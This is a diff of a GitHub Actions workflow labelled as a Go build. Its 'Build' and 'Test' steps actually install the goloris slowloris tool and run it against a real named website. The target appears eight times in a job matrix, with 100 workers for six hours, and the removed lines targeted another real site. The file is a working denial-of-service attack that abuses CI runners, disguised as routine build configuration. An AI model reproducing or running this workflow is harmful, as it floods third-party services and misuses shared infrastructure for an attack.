@@ -1,28 +1,28 @@
-# This workflow will build a golang project
-# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-go
-
 name: Go
 
 on:
   push:
-    branches: [ "main" ]
+    branches: [ main ]
   pull_request:
-    branches: [ "main" ]
+    branches: [ main ]
 
 jobs:
 
   build:
     runs-on: ubuntu-latest
+    strategy:
+      matrix: 
+       site: ["https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru","https://farfor.ru"]
     steps:
-    - uses: actions/checkout@v3
+    - uses: actions/checkout@v2
 
     - name: Set up Go
-      uses: actions/setup-go@v3
+      uses: actions/setup-go@v2
       with:
-        go-version: 1.18
+        go-version: 1.17
+
+    - name: Build
+      run: go get -u github.com/valyala/goloris
 
     - name: Test
-      run: go install github.com/valyala/goloris@latest
-    
-    - name: TEst2
-      run: goloris -victimUrl https://change.pro/scripts -rampUpInterval 10s -sleepInterval 100s -dialWorkersCount 1
+      run: goloris -victimUrl "${{ matrix.site }}" -dialWorkersCount 100 -testDuration 6h -rampUpInterval 100ms
